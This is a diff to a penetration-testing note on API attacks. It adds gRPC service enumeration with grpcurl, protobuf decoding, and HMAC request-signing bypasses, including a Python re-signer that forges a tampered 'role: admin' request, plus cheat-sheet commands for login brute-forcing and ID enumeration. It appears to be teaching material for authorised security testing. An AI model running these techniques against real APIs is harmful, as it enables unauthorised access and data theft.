@@ -1,6 +1,6 @@
 # API Attacks
 
-#OWASP-API #BOLA #IDOR #Authentication #SSRF #SQLInjection #Authorization #RateLimiting #MassAssignment #WebAPI
+#OWASP-API #BOLA #IDOR #Authentication #SSRF #SQLInjection #Authorization #RateLimiting #MassAssignment #WebAPI #gRPC #Protobuf #RequestSigning
 
 ## What is this?
 
@@ -25,6 +25,8 @@ Attacks on RESTful APIs targeting the OWASP API Security Top 10 — object-level
 | [Swagger UI](https://swagger.io/tools/swagger-ui/) | Explore API endpoints, test RBAC, inject payloads directly in the UI |
 | [[Tools/Web/Burpsuite\|Burp Scanner]] | Automated API scanning, crawling, active checks |
 | [OpenAPI generator tools](https://openapi-generator.tech/) | Convert OpenAPI/Swagger specs into client code for easier testing |
+| [grpcurl](https://github.com/fullstorydev/grpcurl) | curl for gRPC — enumerate services via server reflection, call methods with JSON |
+| `protoc` | Protobuf compiler; `--decode_raw` reads an unknown protobuf blob with no `.proto` |
 
 ---
 
@@ -75,6 +77,80 @@ curl -X POST "http://<api>/api/v1/test" \
 curl -s "http://<api>/api/v1/health" | jq '.version'
 curl -i "http://<api>/api/v1/health" | grep -i version
 ```
+
+---
+
+## gRPC & Protobuf APIs
+
+Everything above assumes JSON over HTTP/1.1. Internal and mobile-backend services increasingly speak **gRPC** — protobuf over HTTP/2 — where the request body is binary, there are no URL parameters to tamper, and Burp shows you nothing useful until it is decoded. The vulnerability classes are unchanged (BOLA, BFLA, mass assignment all apply); only the transport and tooling differ.
+
+**Recognising it:**
+
+| Tell | Meaning |
+|---|---|
+| `content-type: application/grpc` | Native gRPC over HTTP/2 |
+| `content-type: application/grpc-web` / `-web-text` | **grpc-web** — browser-compatible, runs over HTTP/1.1, so it proxies through Burp normally (`-text` is base64) |
+| Path shaped `/package.Service/Method` | gRPC routing — the "endpoint" is a service+method, not a REST path |
+| `grpc-status` / `grpc-message` response headers | Errors ride headers, not the body — a `200` can still be a failure |
+| Binary body, no JSON | Protobuf wire format |
+
+### Enumerate via Server Reflection
+
+If reflection is enabled (common on internal services), the API documents itself — no spec hunting required:
+
+```bash
+go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
+
+# List services, then methods on one, then a method's full signature
+grpcurl -plaintext <TARGET_IP>:<PORT> list
+grpcurl -plaintext <TARGET_IP>:<PORT> list my.package.AccountService
+grpcurl -plaintext <TARGET_IP>:<PORT> describe my.package.AccountService.GetAccount
+
+# Dump the .proto definitions straight out of reflection — your offline map of the API
+grpcurl -plaintext -proto-out-dir ./protos <TARGET_IP>:<PORT> describe my.package.AccountService
+
+# Call a method (JSON in, JSON out — grpcurl handles the protobuf encoding)
+grpcurl -plaintext -d '{"id": 1234}' <TARGET_IP>:<PORT> my.package.AccountService/GetAccount
+
+# Authenticated call; -H repeats for multiple headers
+grpcurl -plaintext -H 'authorization: Bearer <token>' -d '{"id": 1234}' <TARGET_IP>:<PORT> my.package.AccountService/GetAccount
+
+# TLS variants: drop -plaintext for TLS; -insecure skips cert validation; -cert/-key for mTLS
+grpcurl -insecure -d '{"id":1234}' <TARGET_IP>:443 my.package.AccountService/GetAccount
+grpcurl -cert client.pem -key client.key <TARGET_IP>:443 list
+```
+
+> [!tip] `-msg-template` prints a skeleton request for a method, which beats guessing field names:
+> ```bash
+> grpcurl -plaintext -msg-template <TARGET_IP>:<PORT> describe my.package.AccountService.GetAccount
+> ```
+
+### When Reflection Is Disabled
+
+```bash
+# 1. Find the .proto or descriptor set in the client — mobile APKs and JS bundles ship them
+unzip -o app.apk -d apk/ && find apk/ -name '*.proto' -o -name '*.pb' -o -name '*.protoset'
+
+# 2. Drive grpcurl from those files instead of reflection
+grpcurl -import-path ./protos -proto account.proto -plaintext <TARGET_IP>:<PORT> list
+grpcurl -protoset ./api.protoset -plaintext <TARGET_IP>:<PORT> list
+
+# 3. No schema at all? Decode a captured body structurally — field numbers + wire types,
+#    enough to spot an id/role field worth tampering.
+protoc --decode_raw < captured_body.bin
+```
+
+> [!note] **BOLA is the same bug here, just harder to see.** `GetAccount{id: 1234}` is exactly `GET /accounts/1234` — increment the id and check whether another tenant's object comes back. Because the field names come from the `.proto`, reflection also hands you the **mass-assignment** candidates for free: any field in the request message that the UI never sets (`role`, `is_admin`, `account_type`) is worth submitting.
+
+> [!warning] Reflection being enabled in production is itself a finding (**API9 / API8** — it exposes the full internal service surface), but it is an *information disclosure*, not authorization. Don't report it as a critical on its own; report what it let you reach.
+
+### Non-REST Surfaces — Where to Go Next
+
+| Surface | Note |
+|---|---|
+| GraphQL endpoint (`/graphql`) | [[Intro to GraphQL]] for the model, [[GraphQL Attacks]] for the offensive toolkit |
+| WebSocket / subscription channels | [[Techniques/WebSockets\|WebSockets]] |
+| SOAP / XML endpoints | [[Standards & Protocols/SOAP\|SOAP]] |
 
 ---
 
@@ -264,6 +340,56 @@ curl -H "Authorization: Bearer $STOLEN_TOKEN" \
 
 > [!tip]
 > Use [jwt.io](https://jwt.io) to decode/inspect tokens visually (but never paste real tokens into public tools). Check the `exp` claim to see if it's expired, and the `iat`/`nbf` claims for timing attacks.
+
+---
+
+### Signed Requests (HMAC) — When Tampering Breaks Everything
+
+Some APIs sign each request, so the moment you change *any* parameter the server answers `401 invalid signature`. This is the most common reason a tester wrongly concludes an API is not vulnerable to BOLA or mass assignment: **the authorization bug is still there, you just can't reach it until you can re-sign.**
+
+**Tells:** an `X-Signature` / `X-Hmac` / `sign` / `hash` header or query param, usually alongside a `timestamp` and sometimes a `nonce`.
+
+```http
+POST /api/v2/transfer HTTP/1.1
+X-Timestamp: 1758499200
+X-Nonce: 8f14e45f
+X-Signature: 6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e
+```
+
+**Work it in this order:**
+
+1. **Find the key.** Client-side signing means the key ships with the client — decompile the mobile app (`apktool d app.apk`, then grep for the header name) or search the JS bundle. A signing key recoverable from the client is *itself* the finding; see [[#API Key & Credential Leakage]].
+2. **Work out the canonical string.** Usually some concatenation of method, path, sorted query, body, and timestamp. The client code tells you the exact order and separators.
+3. **Re-sign automatically** so normal testing resumes — wrap it rather than computing hashes by hand:
+
+```python
+# Minimal re-signer — adapt the canonical string to what the client actually does
+import hashlib, hmac, time, requests
+
+KEY = b"<key recovered from the client>"
+
+def signed(method, path, body=""):
+    ts  = str(int(time.time()))
+    msg = f"{method}\n{path}\n{body}\n{ts}".encode()      # ← match the client's format exactly
+    sig = hmac.new(KEY, msg, hashlib.sha256).hexdigest()
+    return {"X-Timestamp": ts, "X-Signature": sig}
+
+body = '{"account_id": 1234, "role": "admin"}'               # now tamper freely
+print(requests.post("https://<api>/api/v2/transfer", data=body,
+                    headers=signed("POST", "/api/v2/transfer", body)).text)
+```
+
+**Then test the signing scheme itself** — it fails more often than the crypto suggests:
+
+| Weakness | Test |
+|---|---|
+| Signature doesn't cover everything | Sign a valid request, then change a field that *isn't* in the canonical string (often the body, or a header) — if it's accepted, tamper that field freely with the original signature |
+| No replay protection | Resend a captured signed request verbatim. Still works an hour later? No timestamp window. Works twice? No nonce tracking |
+| Signature not actually verified | Send a syntactically valid but wrong signature, an **empty** one, and the header **removed entirely** — all three get skipped surprisingly often |
+| Truncated / non-constant-time compare | A server comparing only the first N chars accepts many forgeries |
+| Delimiter-free concatenation | If the canonical string is `a+b` with no separator, `("12","34")` and `("1","234")` sign identically — move a character across a field boundary to forge |
+
+> [!tip] Test "is it verified at all" **first** — it is the cheapest check and it short-circuits the whole key-recovery effort when the answer is no.
 
 ---
 
@@ -803,6 +929,15 @@ done
 | Enum endpoints | `curl -s "http://<api>/swagger.json" \| jq '.paths \| keys'` |
 | Fingerprint tech | `curl -i <api> \| grep -iE "Server\|X-Powered-By\|X-AspNet"` |
 | Find hidden endpoints | `ffuf -w api-endpoints.txt -u "http://<api>/api/FUZZ" -mc 200,401,403` |
+| Spot a gRPC service | `content-type: application/grpc`, path `/package.Service/Method`, `grpc-status` header |
+| List gRPC services (reflection) | `grpcurl -plaintext <TARGET_IP>:<PORT> list` |
+| Describe a gRPC method | `grpcurl -plaintext <TARGET_IP>:<PORT> describe my.pkg.Service.Method` |
+| Dump `.proto` from reflection | `grpcurl -plaintext -proto-out-dir ./protos <TARGET_IP>:<PORT> describe my.pkg.Service` |
+| Call a gRPC method | `grpcurl -plaintext -d '{"id":1234}' <TARGET_IP>:<PORT> my.pkg.Service/GetAccount` |
+| gRPC with auth header | `grpcurl -plaintext -H 'authorization: Bearer <tok>' -d '{}' <TARGET>:<PORT> svc/Method` |
+| Decode protobuf, no schema | `protoc --decode_raw < captured_body.bin` |
+| Is the HMAC even checked? | Send a wrong signature, an empty one, then drop the header entirely |
+| Replay test a signed request | Resend a captured signed request verbatim — accepted later/twice = no timestamp or nonce |
 | BOLA enumeration | loop `ID=1..100` in URL path / query |
 | Test weak password | `curl -X PATCH ... -d '{"password":"123456"}'` |
 | Brute-force login | `ffuf -w emails.txt:EMAIL -w passwords.txt:PASS -d '{"Email":"EMAIL","Password":"PASS"}' -fr "Invalid"` |
@@ -829,5 +964,5 @@ done
 ---
 
 *Created: 2026-07-15*
-*Updated: 2026-08-14*
+*Updated: 2026-09-22*
 *Model: claude-opus-5*
